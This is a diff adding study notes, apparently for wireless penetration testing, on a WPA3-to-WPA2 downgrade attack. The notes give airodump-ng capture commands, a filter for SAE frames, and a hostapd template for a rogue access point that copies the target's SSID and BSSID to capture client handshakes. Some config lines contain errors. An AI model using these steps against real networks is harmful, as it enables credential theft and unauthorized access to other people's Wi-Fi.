@@ -1,3 +1,41 @@
 Rogue APs
 -----------
+If going after WPA3 it will automatically be a difficult target to collect
 
+WPA3 Authentication
+--
+SAE happens before the 4 way handshake, encrypted
+
+sudo airodump-ng wlan1
+sudo airodump-ng -w <FILENAME> -c <CHANNEL> --bssid <MAC> --gpsd <interface>
+sudo airodump-ng -w <FILENAME> -c <CHANNEL(S)> --gpsd <interface>
+
+Filter by wlan.fixed.auth.alg==3 to see the connection. SAE Handshake consits of four authentication frames.
+Next pull up a beacon frame to see if the AP supports WPA2. 
+
+EAPOL
+--
+After the SAE authentication exchange, WPA2s 4-way handshake is executed, but this 4-way handshake is encrypted by the SAE process and cannot be broken by hashcat.
+
+To recover the key, we must force the client to downgrade to WPA2, and capture that key exchange.
+One way we can do this is to use a rogue AP, using the target's SSID, but only supporting WPA2 and capture the EAPOL connection of the client with our rogue AP.
+
+Rogue APs
+--
+sudo apt install haveged hostapd git util-linux procps iproute2 iw dnsmasq iptables
+
+Create a .conf file that has these parameters to configure:
+  interface=<interface>
+  ssid=<ssid>
+  channel=<CHANNEL>
+  hw_mode=g
+  bssid=<MAC>
+  wpa=3
+  wpa_key_mgmt=WPA_PSK
+  wpa_pairwise=TKIP CCMP
+  wpa_passphrase=<password>
+  auth_algs=3
+
+Edit the parameters in the .conf to mimic the tgt AP for Clients to connect to
+
+sudo nano tgtAP.conf
